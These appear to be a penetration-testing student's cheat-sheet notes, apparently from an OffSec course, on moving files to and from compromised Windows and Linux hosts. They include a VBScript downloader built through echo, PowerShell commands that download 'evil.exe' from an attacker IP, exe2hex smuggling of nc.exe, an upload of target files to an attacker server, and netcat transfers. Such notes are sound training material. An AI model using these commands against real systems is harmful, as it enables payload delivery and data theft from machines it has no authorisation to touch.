do not install new tool, use native tools

# pure-ftpd
//install on kali
sudo apt update && sudo apt-y install pure-ftpd

# non-interactive shells
lack job control, su support, etc. or any feedback on what we are doing

* ``ls`` command not interactive
* ``ftp`` is an interactive program (requires user interaction to complete)
* go get interactive shell:
``python -c "import pty;pty.spawn('/bin/bash')"``

# windows 
## File transfer via FTP
* in our kali place this binary: ``sudo cp /usr/share/windows-resources/binaries/nc.exe /ftphome/``
* restart ftp: ``sudo systemctl restart pure-ftpd``
* on target windows system: transfer file of *ftp.txt* by typing: ``ftp -v -n -s:ftp.txt`` should be the kali ip, *kali* is the ftp pw in this file
* The ftp -s option accepts a text-based command list that effectively makes the client noninteractive.

## Windows Downloads Using Scripting Languages
### older windows systems
#### typing following commands in a windows system's cmd
``` c
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wge
t.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.
vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```
#### execute wget
* use (file)[scripts\filedownload\wget.vbs] to get download a file
* cpy the wget on linux by ``sudo cp /usr/share/windows-resources/binaries/wget.exe /var/www/html/``
* start apache
* execute command ``cscript wget.vbs http://10.11.0.4/evil.exe evil.exe``

## newer windows system with powershell
### install wget
```
C:\Users\Offsec> echo $webclient = New-Object System.Net.WebClient >>wget.ps1
C:\Users\Offsec> echo $url = "http://10.11.0.4/evil.exe" >>wget.ps1
C:\Users\Offsec> echo $file = "new-exploit.exe" >>wget.ps1
C:\Users\Offsec> echo $webclient.DownloadFile($url,$file) >>wget.ps1
```
more on offsecs slides

### decreasing file size
compresses file by 50%
``sudo upx -9 nc.exe``

## file downloads via e2ehex and powershell
* decreate file size (see previous comment)
* execute script: ``exe2hex -x nc.exe -p nc.cmd``
* generates a nc.cmd via hex code
* copy commands from nc.cmd in the clipboard by: ``cat nc.cmd | xclip -selection clipboard``
* we can paste i then into our windows machine cmds (bind shell) 

## getting data from a client to our kali machine (via http post request)
* create [upload.php](scripts/filetransfers/upload.php) file in ``var/www/html/upload.php``
* create uploads folder in apache ``sudo mkdir /var/www/uploads``
* modifying folder permissions: ``ps -ef | grep apache`` by giving the www-data user owner and write permissions on oploads folder: ``sudo chown www-data: /var/www/uploads``
* On windows machine run: ``powershell(New-Object System.Net.WebClient).UploadFile('http://192.168.0.9/upload.php', 'fileToTransfer.jpg')``

# for very old windows machines
* first install an configure tft servers in kali
=> see slides

# linux and netcat
* on a system open bind shell for a specific file f.e.: ``nc -nlvp 4445 > C:\Users\offsec\binary.exe``
* on kali we send our binary.exe to our windows client: ``nc -w 3 10.11.0.22 4445 < binary.exe``